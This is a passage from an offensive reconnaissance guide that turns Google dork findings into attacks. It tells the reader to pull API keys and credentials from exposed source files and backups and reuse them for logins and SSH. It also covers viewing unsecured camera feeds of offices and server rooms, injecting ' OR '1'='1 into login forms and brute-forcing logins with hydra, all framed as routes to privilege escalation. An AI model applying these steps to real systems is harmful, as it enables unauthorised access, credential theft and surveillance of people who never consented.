  Source code files (`.php`, `.js`, `.py`) or configuration files (`.env`, `.conf`).

- Steps:
  1. Look for:
     - Hardcoded credentials.
     - Hidden API keys or tokens.
     - Sensitive comments that hint at vulnerabilities.

- Example: Extracting API Keys:
  ```bash
  grep -i "apikey" discovered_file.php
  ```
- How to Use:
  - Use exposed API keys to query APIs for additional data.
  - Access third-party services via exposed tokens.



 4. Exploit Backup Files

 A. Old or Forgotten Backup Files
- Files Found Using Dorks:
  ```bash
  site:example.com ext:bak | ext:old | ext:backup
  ```
- How to Use:
  1. Extract sensitive content from backups (e.g., database dumps or source code).
  2. Use discovered credentials to test login pages or SSH access.

 Example: Exploring a SQL Backup
- Command to Inspect SQL Dump:
  ```bash
  less backup.sql
  ```
  - Look for user tables containing plaintext or weakly hashed passwords.
  - Reuse credentials across the application or related systems.



 5. Assess Security of Public Cameras
- Dork:
  ```bash
  inurl:"/view/view.shtml"
  ```
- Application:
  - View unsecured camera feeds for reconnaissance of physical locations (e.g., server rooms, office environments).
  - Correlate physical insights with digital recon efforts.



 6. Validate Findings with Other Recon Tools

 A. Using Nmap
- Use information from dorking (e.g., subdomains or IP addresses) to scan for open ports and services:
  ```bash
  nmap -A subdomain.example.com
  ```

 B. Using Shodan
- Look up IPs or services discovered via dorking on Shodan for additional exposure:
  ```bash
  shodan search "apache port:80"
  ```



 7. Exploit Login Pages
- Findings:
  Login portals (`inurl:login`) discovered via dorking.

- Steps:
  1. Test for SQL Injection vulnerabilities:
     - Inject `' OR '1'='1` into the username or password field.
  2. Automate brute-force attempts:
     ```bash
     hydra -l admin -P passwords.txt example.com http-get "/login"
     ```



 8. Automate Recon with Custom Scripts
To integrate Google Dorking into a recon workflow, automate the process of querying and applying results.

- Python Script Example:
  ```python
  from googlesearch import search

  query = "site:example.com filetype:sql"
  for result in search(query, num_results=10):
      print(result)
  ```

- How to Use:
  - Automate discovery and download of exposed files.
  - Integrate results with tools like Netcat or Nmap for further probing.



 Key Takeaways
1. Immediate Application:
   - Use discovered files, credentials, and configurations for privilege escalation.
2. Enhanced Workflow:
   - Feed findings into other tools (Nmap, Shodan, Netcat) to deepen insights.
3. Actionable Intelligence:
   - Exposed information provides a starting point for crafting exploit scenarios.




```
   --------
  |        |
 /  O   O  \
|    \_/    |
 \  -----   /
  |        |
   --------
```
